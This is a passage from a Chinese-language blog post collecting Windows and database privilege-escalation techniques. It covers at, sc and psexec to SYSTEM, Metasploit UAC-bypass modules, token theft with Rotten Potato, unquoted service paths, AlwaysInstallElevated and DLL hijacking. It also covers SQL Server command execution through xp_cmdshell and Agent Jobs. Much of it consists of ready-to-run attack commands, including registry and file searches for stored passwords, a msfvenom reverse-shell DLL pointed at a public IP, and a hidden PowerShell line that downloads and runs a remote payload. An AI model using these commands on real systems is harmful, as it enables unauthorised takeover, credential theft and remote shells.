XP中内置的命令，它也可以媲美Windows中的”计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。</p><p>因为at命令默认是以system权限下运行的所以我们可以利用以下命令，进行提权</p><p>at 时间 /interactive cmd 其中里面的/interactive参数是开启交互模式</p><p>设置一个定时任务，到时间后自动弹出一个cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225229034.png" alt="image-20220312225229034"></p><p>此时桌面还是</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225516674.png" alt="image-20220312225516674"></p><p>利用system权限打开任务管理器，结束桌面进程</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225723090.png" alt="image-20220312225723090"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225450882.png" alt="image-20220312225450882"></p><p>再重新打开</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312225804841.png" alt="image-20220312225804841"></p><p>由此可以实现与msf的联动</p><p>在webshll的cmd中执行  at 时间 /interactive msf的后门程序。(注：这里的权限一定要是Administrator)</p><p>会直接反弹回system权限的会话</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312230306281.png" alt="image-20220312230306281"></p><h2 id="sc提权"><a href="#sc提权" class="headerlink" title="sc提权"></a>sc提权</h2><p><strong>适用于windows 7/8、03/08、12/16</strong></p><p>因为at命令在win7，win8等更高版本的系统上都已经取消掉了，所以在一些更高版本的windows操作系统上我们可以用sc命令进行提权</p><p>SC命令是XP系统中功能强大的DOS命令,SC命令能与”服务控制器”和已安装设备进行通讯。SC是用于与服务控制管理器和服务进行通信的命令行程序。</p><p>也就是说 就是sc可以启动一个服务</p><p>提权命令</p><pre><code class="text">sc Create systemcmd binPath= &quot;cmd /K start&quot; type= own type= interact #设置一个启动cmd窗口的服务sc start systemcmd # 启动该服务创建一个名叫syscmd的cmd服务，我们也可以把binPath换成木马的路径，这样就可以获得一个system权限的会话</code></pre><p>其中systemcmd是服务名称，可以随意填写，binpath是启动的命令，type=own是指服务这个服务属于谁，type=interact。这里再解释一下 cmd/k start 这个命令，这个命令就是启动一个新的cmd窗口</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312231452287.png" alt="image-20220312231452287"></p><h2 id="psexec提权"><a href="#psexec提权" class="headerlink" title="psexec提权"></a>psexec提权</h2><p>**适用版本：Win2003 &amp; Win2008 **</p><p><strong>微软官方工具包</strong>：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p><p><strong>提权命令</strong>：</p><pre><code class="text">PsExec.exe /accepteula /s \\127.0.0.1 cmd #直接交互式shellpsexec.exe -accepteula -s -i -d cmd.exe #弹出一个cmd窗口</code></pre><p>开启的cmd窗口也是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312232849689.png" alt="image-20220312232849689"></p><h2 id="绕过UAC提权"><a href="#绕过UAC提权" class="headerlink" title="绕过UAC提权"></a>绕过UAC提权</h2><h3 id="UAC简介"><a href="#UAC简介" class="headerlink" title="UAC简介"></a><strong>UAC简介</strong></h3><p><strong>1.什么是用户帐户控制(UAC)？</strong></p><p>Microsoft的Windows Vista和Windows Server 2008操作系统引入了一种良好的用户帐户控制架构，以防止系统范围内的意外更改，这种更改是可以预见的，并且只需要很少的操作量。</p><p>换句话说，它是Windows的一个安全功能，它支持防止对操作系统进行未经授权的修改，UAC确保仅在管理员授权的情况下进行某些更改。如果管理员不允许更改，则不会执行这些更改，并且Windows系统保持不变。</p><p><strong>2.UAC如何运行？</strong></p><p>UAC通过阻止程序执行任何涉及有关系统更改/特定任务的任务来运行。除非尝试执行这些操作的进程以管理员权限运行，否则这些操作将无法运行。如果您以管理员身份运行程序，则它将具有更多权限，因为它将被”提升权限”，而不是以管理员身份运行的程序。</p><p>一些没有管理员权限无法完成的操作：</p><ul><li>注册表修改（如果注册表项在HKEY_LOCAL_MACHINE下（因为它影响多个用户），它将是只读的）</li><li>加载设备驱动程序</li><li>DLL注入</li><li>修改系统时间（时钟）</li><li>修改用户帐户控制设置（通过注册表，可以启用/禁用该设置，但您需要正确的权限才能执行此操作）</li><li>修改受保护的目录（例如Windows文件夹，Program Files）</li><li>计划任务（例如，以管理员权限自动启动）</li></ul><p><strong>UAC不会自动阻止恶意软件，其目的不是确定程序是否是恶意软件。这同样取决于用户。如果将以管理员权限执行程序，则将提醒用户并且需要用户确认。</strong> </p><p><strong>一般我们通过msf拿到meterprter的会话后，我们可以通过getsystem或者getuid来检查是否是system权限</strong></p><p>如果不是system权限，我们可以通过以下绕过UAC模块对UAC进行绕过，在通过<strong>getsystem进行提权</strong></p><pre><code class="text">#Msfexploit/windows/local/ask #弹出UAC确认窗口，点击后获得system权限exploit/windows/local/bypassuacexploit/windows/local/bypassuac_injectionexploit/windows/local/bypassuac_fodhelperexploit/windows/local/bypassuac_eventvwrexploit/windows/local/bypassuac_comhijack</code></pre><h3 id="Windows权限升级绕过UAC保护"><a href="#Windows权限升级绕过UAC保护" class="headerlink" title="Windows权限升级绕过UAC保护"></a><strong>Windows权限升级绕过UAC保护</strong></h3><p>此模块将通过进程注入使用可信任发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuacmsf exploit windows/local/bypassuac) &gt; set session 1msf exploit(windows/local/bypassuac) &gt; exploit</code></pre><p>从给定的meterpreter中，您可以看到meterpreter会话2已打开，现在以下命令以确定system权限特权.</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235547978.png" alt="image-20220312235547978"></p><h3 id="Windows权限提升绕过UAC保护（内存注入）"><a href="#Windows权限提升绕过UAC保护（内存注入）" class="headerlink" title="Windows权限提升绕过UAC保护（内存注入）"></a><strong>Windows权限提升绕过UAC保护（内存注入）</strong></h3><p>此模块将通过进程注入使用可信任的发布者证书绕过Windows UAC。它将生成关闭UAC标志的第二个shell。在普通技术中，该模块使用反射式DLL注入技术并只除去了DLL payload  二进制文件，而不是三个单独的二进制文件。但是，它需要选择正确的体系架构（对于SYSWOW64系统也使用x64）。如果指定exe::custom，应在单独的进程中启动 payload 后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_injectionmsf exploit(windows/local/bypassuac_injection) &gt; set session 1msf exploit(windows/local/bypassuac_injection) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235641548.png" alt="image-20220312235641548"></p><h3 id="绕过Windows-UAC保护（通过FodHelper注册表项）"><a href="#绕过Windows-UAC保护（通过FodHelper注册表项）" class="headerlink" title="绕过Windows UAC保护（通过FodHelper注册表项）"></a><strong>绕过Windows UAC保护（通过FodHelper注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows fodhelper.exe应用程序时调用的自定义命令来绕过Windows 10 UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定exe:custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_fodhelpermsf exploit(windows/local/bypassuac_fodhelper) &gt; set session 1msf exploit(windows/local/bypassuac_fodhelper) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235727956.png" alt="image-20220312235727956"></p><h3 id="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"><a href="#Windows权限升级绕过UAC保护（通过Eventvwr注册表项）" class="headerlink" title="Windows权限升级绕过UAC保护（通过Eventvwr注册表项）"></a><strong>Windows权限升级绕过UAC保护（通过Eventvwr注册表项）</strong></h3><p>此模块将通过在当前用户配置单元下劫持注册表中的特殊键并插入将在启动Windows事件查看器时调用的自定义命令来绕过Windows UAC。它将生成关闭UAC标志的第二个shell。此模块修改注册表项，但在调用payload后将清除该项。该模块不需要payload的体系架构和操作系统匹配。如果指定EXE ::Custom，则应在单独的进程中启动payload后调用ExitProcess（）。</p><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_eventvwrmsf exploit(windows/local/bypassuac_eventvwr) &gt; set session 1msf exploit(windows/local/bypassuac_eventvwr) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235806004.png" alt="image-20220312235806004"></p><h3 id="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"><a href="#Windows权限升级绕过UAC保护（通过COM处理程序劫持）" class="headerlink" title="Windows权限升级绕过UAC保护（通过COM处理程序劫持）"></a><strong>Windows权限升级绕过UAC保护（通过COM处理程序劫持）</strong></h3><pre><code class="text">msf &gt; use exploit/windows/local/bypassuac_comhijackmsf exploit(windows/local/bypassuac_comhijack) &gt; set session 1msf exploit(windows/local/bypassuac_comhijack) &gt; exploit</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220312235844933.png" alt="image-20220312235844933"></p><h2 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a><strong>令牌窃取</strong></h2><p><strong>适用于2008之前版本</strong></p><p><strong>令牌简介</strong></p><p>描述进程或者线程安全上下文的一个对象。不同的用户登录计算机后， 都会生成一个Access Token，这个Token在用户创建进程或者线程时会被使用，不断的拷贝，这也就解释了A用户创建一个进程而该进程没有B用户的权限。一般用户双击运行一个进程都会拷贝explorer.exe的Access Token。访问令牌分为：</p><p>* 授权令牌（Delegation token）：交互式会话登陆（例：本地用户登陆、用户桌面等）</p><p>* 模拟令牌（Impersonation token）：非交互式登陆（例：net use 访问共享文件）</p><p>两种token只有在系统重启后才会清除；授权令牌在用户注销后，该令牌会变为模拟令牌依旧有效。</p><p>同样也可以这样理解，<strong>当前系统中的某个进程或线程能访问到什么样的系统资源,完全取决于你当前进程是拿着谁的令牌。</strong></p><p>默认情况下，我们列举令牌，只能列举出当前用户和比当前用户权限更低用户的令牌。令牌的数量取决于当前shell的访问级别，如果当前的权限是一个普通域用户，所以令牌窃取只能窃取到当前用户本身是。如果当前的shell是administrator或者是system，我们就可以看到系统中的所有的令牌。</p><p><strong>攻击方法</strong></p><p><strong>第一种首先提前获取一个session</strong></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -umeterpreter &gt; impersonate_token WIN-2HU3N1\\Administrator #注意：这里是两个反斜杠\\</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/image-20220313002103573.png" alt="image-20220313002103573"></p><p><strong>第二种借用Rotten potato程序</strong></p><p>链接:<a href="https://github.com/foxglovesec/RottenPotato.git">https://github.com/foxglovesec/RottenPotato.git</a></p><pre><code class="text">meterpreter &gt; use incognitometerpreter &gt; list_tokens -uWIN-2HU3N1\Administratormeterpreter &gt; upload /root/Rottenpotato/rottenpotato.exeSuccessfullymeterpreter &gt; execute -HC -f rottenpotato.exeSuccessfullymeterpreter &gt; getuid...NT AUTHORITY\SYSTEM</code></pre><h2 id="烂土豆提权-MS16-075"><a href="#烂土豆提权-MS16-075" class="headerlink" title="烂土豆提权-MS16-075"></a><strong>烂土豆提权-MS16-075</strong></h2><p><strong>一般烂土豆需要来配合令牌窃取来进行提权</strong></p><p><strong>注意（重点：用烂土豆配合本地用户提权是成功不了的，必须是web权限或数据库权限）</strong></p><ol><li>单纯令牌窃取：Web权限或本地权限</li><li>配合烂土豆提权：web权限或数据库等权限</li></ol><p><strong>烂土豆提权原理</strong></p><ol><li>欺骗 “NT AUTHORITY\SYSTEM”账户通过NTLM认证到我们控制的TCP终端。</li><li>对这个认证过程使用中间人攻击（NTLM重放），为”NT AUTHORITY\SYSTEM”账户本地协商一个安全令牌。这个过程是通过一系列的Windows API调用实现的。</li><li>模仿这个令牌。只有具有”模仿安全令牌权限”的账户才能去模仿别人的令牌。一般大多数的服务型账户（IIS、MSSQL等）有这个权限，大多数用户级的账户没有这个权限。</li></ol><p>所以，一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。测试过程中，我发现使用已经建好的账户（就是上面说的用户级账户）去反弹meterpreter然后再去执行EXP的时候会失败，但使用菜刀（IIS服务器权限）反弹meterpreter就会成功。</p><p><strong>攻击方法</strong></p><pre><code class="text">meterpreter &gt; upload /root/Rottenpotato/rottenpotato.exemeterpreter &gt; execute -HC -f rottenpotato.exemeterpreter &gt; use incognitometerpreter &gt; list_tokens -u</code></pre><p>会发现令牌列表里面存在system的令牌，在用system的令牌进行提权</p><p>Juicy Potato的限制条件如下：</p><p>1、需要支持SeImpersonate或者SeAssignPrimaryToken权限<br>2、开启DCOM<br>3、本地支持RPC或者远程服务器支持PRC并能成功登录<br>4、能够找到可用的COM对象</p><p>一般从web拿到的webshell都是IIS服务器权限，是具有这个模仿权限的。一般大多数的服务型账户IIS、MSSQL等，有这个权限，大多数用户级的账户没有这个权限，这些都可以whoami /priv 试一下看看有没有模仿权限。</p><p><strong>烂土豆版本</strong></p><p>RottonPatato脚本：</p><ol><li><a href="https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe">https://github.com/SecWiki/windows-kernel-exploits/blob/master/MS16-075/potato.exe</a></li><li><a href="https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe">https://github.com/breenmachine/RottenPotatoNG/blob/master/RottenPotatoEXE/x64/Release/MSFRottenPotato.exe</a></li><li><a href="https://github.com/foxglovesec/RottenPotato">https://github.com/foxglovesec/RottenPotato</a></li></ol><h2 id="可信任服务路径漏洞"><a href="#可信任服务路径漏洞" class="headerlink" title="可信任服务路径漏洞"></a><strong>可信任服务路径漏洞</strong></h2><p><strong>如果一个服务的可执行文件的路径没有被双引号引起来且包含空格，那么这个服务就是有漏洞的</strong></p><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>这里假设有一个服务路径 C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe</p><ol><li>带引号时：”C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe”会被看成一个完整的服务路径，故不会产生漏洞。</li><li>不带引号时：我们认为的服务路径是C:\Program Files (x86)\Common Files\Tencent\QQMusic\QQMusicService.exe，但是由于没有双引号的包裹，Windows会认为C:\Program空格后面的为Program这个程序的参数来进行启动服务。这样攻击者就可以命名一个为Program.exe的后门文件放在c盘下，进而等待含漏洞服务路径的启动或重启导致后门文件的执行。</li></ol><h3 id="攻击方法"><a href="#攻击方法" class="headerlink" title="攻击方法"></a>攻击方法</h3><p>寻找存在漏洞的服务</p><pre><code class="text">wmic service get name,displayname,pathname,startmode | findstr /i &quot;Auto&quot; | findstr /i /v &quot;C:\Windows\\&quot; | findstr /i /v &quot;&quot;&quot;</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165349775-559246082.png" alt="img"></p><p>把我们后门文件重命名放在对应的文件路径下</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350108-1640161384.png" alt="img"></p><p>  在msf上进行监听，然后启动对应服务</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350469-809846620.png" alt="img"></p><p>接收到shell，且是system权限</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165350841-1807683012.png" alt="img"></p><pre><code class="text">#msf检测攻击模块exploit/windows/local/unquoted_service_path#正常接收到会话后，不久就会自动断开连接，需要开启命令自动迁移进程set AutoRunScript migrate -f</code></pre><pre><code class="text">#手动攻击我们需要执行的exe根据需要重命名并放置在可写入的有漏洞目录下然后重启服务sc stop service_namesc start service_name</code></pre><h2 id="不安全服务权限配合计划任务schtasks或SC命令利用"><a href="#不安全服务权限配合计划任务schtasks或SC命令利用" class="headerlink" title="不安全服务权限配合计划任务schtasks或SC命令利用"></a><strong>不安全服务权限配合计划任务schtasks或SC命令利用</strong></h2><p>如果攻击者对以高权限运行的任务所在的目录具有写权限，就可以使用覆盖原来的服务路径，进而启动我们的恶意程序。（一般用来administrator提权到system，因为普通用户用sc修改服务路径会没有权限，导致不能用该方法提权。）</p><p>accesschk.exe -uwcqv “administrators” * #检查administrators组的权限配置（这里自己创建了一个test服务）</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351169-1682951443.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351505-495496718.png" alt="img"></p><p>sc config “test” binpath=”C:\shell.exe” #用sc命令修改服务对应路径</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165351871-824825594.png" alt="img"></p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352226-1488097995.png" alt="img"></p><p>sc start test #然后我们在msf监听，在启动该服务，就可以接收到我们的shell</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352599-1121177084.png" alt="img"></p><p>当然还可以用schtasks来定时启动服务，schtasks命令比at命令更灵活。而且在Windows Vista、Windows Server 2008及之后版本的操作系统已经弃用at命令。</p><p>#查看计算机的计划任务<br>schtasks /query /fo LIST /v</p><p>schtasks /create /s 10.10.10.80 /tn test /sc onstart /tr c:\artifact.exe /ru system /f</p><p>在远程主机运行”test”任务</p><p>schtasks /run /s 10.10.10.80 /i /tn “test”</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165352923-1541900357.png" alt="img"></p><p> 执行完成之后就删除计划任务</p><p>schtasks /delete /s 10.10.10.80 /tn “test” /f</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353205-57489983.png" alt="img"></p><p> 接着删除IPC$</p><p>net use \10.10.10.80 /del /y</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353471-1410299606.png" alt="img"></p><p> 在使用schtasks命令的时候会在系统留下日志文件C:WindowsTasksSchedLgU.txt。</p><p><strong>参数的意思：</strong></p><p>/create 表示创建计划任务</p><p>/tn 表示任务名</p><p>/tr 指定运行的文件</p><p>/sc 是任务运行频率</p><p>/st 是执行时间</p><p>/s 指定远程机器名或 ip 地址</p><p>/ru 指定运行任务的用户权限，这里指定为最高的 SYSTEM</p><p>/i 表示立即运行</p><p>/F 表示如果指定的任务已经存在，则强制创建任务并抑制警告</p><p>/delete 是删除任务。</p><h2 id="Unattended-Installs（自动安装）"><a href="#Unattended-Installs（自动安装）" class="headerlink" title="Unattended Installs（自动安装）"></a><strong>Unattended Installs（自动安装）</strong></h2><p>自动安装允许程序在不需要管理员关注下自动安装。这种解决方案用于在拥有较多雇员和时间紧缺的较大 型组织中部署程序。如果管理员没有进行清理的话，那么会有一个名为Unattend的XML文件残存在系统上。 这个XML文件包含所有在安装程序过程中的配置，包括一些本地用户的配置，以及管理员账户。</p><p>全盘搜索Unattend文件是个好办法，它通常会在以下一个文件夹中：</p><pre><code class="text">C:\Windows\Panther\C:\Windows\Panther\Unattend\C:\Windows\System32\C:\Windows\System32\sysprep\</code></pre><p>除了Unattend.xml文件外，还要留意系统中的sysprep.xml和sysprep.inf文件，这些文件中都会包含部署操作 系统时使用的凭据信息，这些信息可以帮助我们提权。</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:*vnc.ini /s /b /c</code></pre><p>或者在名称中包含关键词的项目：</p><pre><code class="text">C:\Users\user\Desktop&gt; dir C:\ /s /b /c | findstr /sr *password*</code></pre><p>或者可以在文件内容中搜索password之类的关键字：</p><pre><code class="text">C:\Users\user\Desktop&gt;findstr /si password *.txt | *.xml | *.ini</code></pre><p>可以查询注册表，例如，字符串password：</p><pre><code class="text">reg query HKLM /f password /t REG_SZ /sreg query HKCU /f password /t REG_SZ /s</code></pre><p>在这些文件中通常包含用户名和密码，密码使用base64编码，并且在最后会附加”Password”，所以真正的密 码需要去掉最后的”Password”。</p><p><strong>msf模块</strong>:</p><pre><code class="text">post/windows/gather/enum_unattend</code></pre><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165353799-254963719.png" alt="img"></p><h2 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a><strong>AlwaysInstallElevated</strong></h2><p>AlwaysInstallElevated 是一种允许非管理用户以SYSTEM权限运行Microsoft Windows安装程序包（.MSI文件）的设置。默认情况下禁用此设置，需系统管理员手动启用他。</p><p>可以通过查询以下注册表项来识别此设置：</p><pre><code class="text">[HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001[HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer] &quot;AlwaysInstallElevated&quot;=dword:00000001</code></pre><p>使用reg query命令查询是否存在漏洞:</p><pre><code class="text">C:&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevatedorC:&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated</code></pre><p>如果系统没这个漏洞，它将输出错误:</p><pre><code class="text">ERROR: The system was unable to find the specified registry key or value.</code></pre><p>如果存在漏洞，上面将输出以下内容:</p><p><img src="/2022/03/12/windows%E6%8F%90%E6%9D%83%E6%80%BB%E7%BB%93/2096968-20210819165354233-1421529420.png" alt="img"></p><p>然后我们使用msfvenom生成msi文件，进行提权</p><pre><code class="text">msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o rotten.msimsiexec /quiet /qn /i C:\programdata\rotten.msi# /quiet 安装过程中禁止向用户发送消息# /qn 不使用GUI# /i 安装程序</code></pre><p>msf下的自动模块<br>exploit/windows/local/always_install_elevated</p><h2 id="DLL劫持提权"><a href="#DLL劫持提权" class="headerlink" title="DLL劫持提权"></a><strong>DLL劫持提权</strong></h2><p><strong>原理</strong>：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p><p>1、应用程序加载的目录</p><p>2、C:\Windows\System32</p><p>3、C:\Windows\System</p><p>4、C:\Windows</p><p>5、当前工作目录Current Working Directory，CWD</p><p>6、在PATH环境变量的目录（先系统后用户）</p><p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</p><p>msfvenom -p windows/meterpreter/reverse_tcp lhost=101.37.169.46 lport=6677 -f dll &gt;/opt/test.dll</p><h2 id="常用系统漏洞CVE"><a href="#常用系统漏洞CVE" class="headerlink" title="常用系统漏洞CVE"></a><strong>常用系统漏洞CVE</strong></h2><p>#Windows10</p><p>CVE-2020-0796 <a href="https://www.cnblogs.com/-chenxs/p/12618678.html">https://www.cnblogs.com/-chenxs/p/12618678.html</a></p><p>#Windows7/2008</p><p>CVE-2018-8120 <a href="https://www.cnblogs.com/-mo-/p/11404598.html">https://www.cnblogs.com/-mo-/p/11404598.html</a></p><p>#Windows7/8、2008/2012/2016</p><p>CVE-2017-0213 <a href="https://www.cnblogs.com/-mo-/p/11446144.html">https://www.cnblogs.com/-mo-/p/11446144.html</a></p><p>#SQL Server、IIS通杀 (针对本地用户的，不能用于域用户)</p><p>MS16-075(RottenPotato) <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h1 id="数据库提权"><a href="#数据库提权" class="headerlink" title="数据库提权"></a>数据库提权</h1><p>先来了解一下怎么才能获取到数据库的账号密码？<br>配置文件中，如：conn、config、data、sql、common 、inc文件中<br>安装目录下，如mysql安装目录下的user.MYD文件<br>使用Bruter工具破解—前提是开启了远程连接<br>使用脚本文件获取</p><p><strong>怎么打开远程连接？</strong><br>root账户一般只能本地访问，但在开发过程中可能需要打开root的远程访问权限。<br>登录到mysql中，为root进行远程访问的授权，执行下面的命令：</p><pre><code>GRANT ALL PRIVILEGES ON *.* TO root@&quot;%&quot; IDENTIFIED BY &quot;root&quot;;flush privileges;</code></pre><p>第一句中”%”表示任何主机都可以远程登录到该服务器上访问。如果要限制只有某台机器可以访问，将其换成相应的IP即可<br>第二句表示从mysql数据库的grant表中重新加载权限数据。因为MySQL把权限都放在了cache中，所以在做完更改后需要重新加载。</p><p><strong>提权</strong>:</p><h2 id="Mysql提权"><a href="#Mysql提权" class="headerlink" title="Mysql提权"></a>Mysql提权</h2><h3 id="udf提权："><a href="#udf提权：" class="headerlink" title="udf提权："></a>udf提权：</h3><p>通过创建用户自定义函数，对mysql功能进行扩充，可以执行系统任意命令，将mysql账号root转化为系统system权限。</p><h3 id="mof提权："><a href="#mof提权：" class="headerlink" title="mof提权："></a>mof提权：</h3><p>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof 这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>启动项提权：将后面脚本上传到系统启动目录，当服务器重启就会自动执行该脚本，从而获取系统权限。</p><h2 id="SQL-Server-提权"><a href="#SQL-Server-提权" class="headerlink" title="SQL Server 提权"></a>SQL Server 提权</h2><p>利用SQL Sercer执行系统命令的方式也有多种，比如xp_cmdshell、SP_OACREATE、沙盒、Agent Job、CLR来提权。</p><h3 id="使用xp-cmdshell进行提权："><a href="#使用xp-cmdshell进行提权：" class="headerlink" title="使用xp_cmdshell进行提权："></a>使用xp_cmdshell进行提权：</h3><pre><code class="text"># 启用xp_cmdshellEXEC master..sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC master..sp_configure &#39;xp_cmdshell&#39;, 1;RECONFIGURE;# 通过xp_cmdshell执行系统命令Exec master.dbo.xp_cmdshell &#39;whoami&#39;</code></pre><h3 id="SP-OACREATE"><a href="#SP-OACREATE" class="headerlink" title="SP_OACREATE:"></a>SP_OACREATE:</h3><pre><code class="text"># 开启组件EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE WITH OVERRIDE;EXEC sp_configure &#39;Ole Automation Procedures&#39;, 1;RECONFIGURE WITH OVERRIDE;   EXEC sp_configure &#39;show advanced options&#39;, 0;# 执行系统命令（无回显）declare @shell int exec sp_oacreate &#39;wscript.shell&#39;,@shell output exec sp_oamethod @shell,&#39;run&#39;,null,&#39;c:\windows\system32\cmd.exe /c whoami&#39;</code></pre><h3 id="通过沙盒执行命令"><a href="#通过沙盒执行命令" class="headerlink" title="通过沙盒执行命令"></a>通过沙盒执行命令</h3><pre><code class="text"># 开启沙盒exec master..xp_regwrite &#39;HKEY_LOCAL_MACHINE&#39;,&#39;SOFTWARE\Microsoft\Jet\4.0\Engines&#39;,&#39;SandBoxMode&#39;,&#39;REG_DWORD&#39;,1# 利用jet.oledb执行命令select * from openrowset(&#39;microsoft.jet.oledb.4.0&#39;,&#39;;database=c:\windows\system32\ias\dnary.mdb&#39;,&#39;select shell(&quot;whoami&quot;)&#39;)</code></pre><h3 id="通过Agent-Job执行命令"><a href="#通过Agent-Job执行命令" class="headerlink" title="通过Agent Job执行命令"></a>通过Agent Job执行命令</h3><p>修改开启Ageent Job，执行无回显CobaltStrike生成powershell上线</p><pre><code class="text">USE msdb; EXEC dbo.sp_add_job @job_name = N&#39;test_powershell_job1&#39; ; EXEC sp_add_jobstep @job_name = N&#39;test_powershell_job1&#39;, @step_name = N&#39;test_powershell_name1&#39;, @subsystem = N&#39;PowerShell&#39;, @command = N&#39;powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#39;&#39;http://192.168.214.129:80/a&#39;&#39;))&quot;&#39;, @retry_attempts = 1, @retry_interval = 5 ;EXEC dbo.sp_add_jobserver @job_name = N&#39;test_powershell_job1&#39;; EXEC dbo.sp_start_job N&#39;test_powershell_job1&#39;;</code></pre><p>整体思路<br>1.通过各种漏洞拿到shell<br>2.找网站的配置文件（找账号、密码）<br>3.使用 工具 提权</p><p>数据库防御<br>1、限止数据库远程连接，给数据库帐户设置密码必须&gt;8位以上并数字+字母+特殊符号等。<br>2、不要给网站配置root或SA权限。必须给每个网站独立分配数据库帐户并限格控制好权限。<br>3、及时升级数据库补丁。<br>4、安装Waf进行防御。<br>5、购买数据库审计设备。</p><p><strong>基本转自随风师傅，做了点小小改动，因为自己太菜了写不出来这么好的文章，随风师傅tql:<a href="https://www.cnblogs.com/sfsec/p/15162635.html">https://www.cnblogs.com/sfsec/p/15162635.html</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> windows提权 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
